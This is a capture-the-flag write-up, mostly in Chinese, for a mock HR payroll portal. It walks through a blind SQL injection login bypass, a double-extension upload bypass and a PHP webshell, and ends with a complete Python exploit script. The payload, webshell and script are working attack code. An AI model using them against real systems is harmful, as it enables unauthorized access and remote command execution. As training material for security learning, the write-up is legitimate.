# X-029-24 Bobby Payroll

> This challenge mimics an HR payroll portal, with a Login section, vulnerable to Boolean-based Blind SQLi (content-based). After exploiting this vulnerability and gaining access, the logged-in user will be able to upload a file (limited to images, therefore needing to bypass this simple protection) and upload a WebShell and read FLAG.txt

- 登录处存在基于回显差异的 SQL 注入（用户名存在与否返回的 JSON 字段不同）。
- 文件上传仅通过文件名包含`.pdf`做了弱校验，可用双扩展绕过（例如：`*.pdf.phtml`）。
- 利用链：SQLi 登录绕过 → 上传 WebShell → 读取 `/FLAG.txt`。

- 访问首页为登录页 `index.php`，前端 AJAX 提交后端返回 JSON：`{"response":"Success|password|username"}`。
- 尝试随便输入账号/密码，抓包观察：
  - 用户名不存在时返回 `{"response":"username"}`
  - 用户名存在但密码错误返回 `{"response":"password"}`
  - 成功登录返回 `{"response":"Success"}`

- 猜测后端语句类似：`SELECT username FROM users WHERE username = '$username'`。
- 若注入 `a' UNION SELECT 'xxx' -- -`，则第一条查询可被构造为“存在”，回包会从 `username` 变为 `password`（表示用户名阶段通过）。
- 进一步构造让第二条校验语句被注释掉：把 `username` 的查询结果“变成”一个能闭合引号并注释后续的字符串，例如让下一条语句里的 `WHERE username = '$usernamenew'` 变成：
  - `WHERE username = '' OR 1=1 -- -' AND ...`（后续被注释，恒为真）。
- 可用 payload：`a' UNION SELECT ''' OR 1=1 -- -`。其中 `'''` 在 SQL 中作为字符串字面量产生一个单引号字符，使下一条语句注释生效，最终返回 `{"response":"Success"}` 并下发 `PHPSESSID`。

登录后访问 `dashboard.php`，有上传接口 `upload.php`，前端只检查扩展 `.pdf`，后端同样仅判断文件名包含`.pdf`字样。Apache/PHP 常见配置会解析 `.phtml` 为 PHP，因此可上传 `rce.pdf.phtml`（文件名包含`.pdf`，最终扩展为`.phtml` 可执行）。

上传 webshell：
```php
<?php system($_GET['c']) ?>
```
上传成功后访问：`/uploaded_invoices/rce.pdf.phtml?c=cat%20/FLAG.txt` 拿到 flag。
## EXP
```python
import requests

base = "http://ip32792"
s = requests.Session()

# 1) SQLi 登录绕过
login_url = base + "/index.php"
payload_user = "a' UNION SELECT ''' OR 1=1 -- -"
data = {"username": payload_user, "password": "x", "submit": "submit"}
r = s.post(login_url, data=data)
print("login resp:", r.text)

# 2) 上传 .pdf.phtml WebShell
upload_url = base + "/upload.php"
php = "<?php system($_GET['c']); ?>"
files = {"invoice": ("rce.pdf.phtml", php, "application/pdf")}
r = s.post(upload_url, files=files)
print("upload resp:", r.text)

# 3) 访问 WebShell 读取 /FLAG.txt
shell_url = base + "/uploaded_invoices/rce.pdf.phtml"
r = s.get(shell_url, params={"c": "cat /FLAG.txt"})
print("flag:", r.text)
```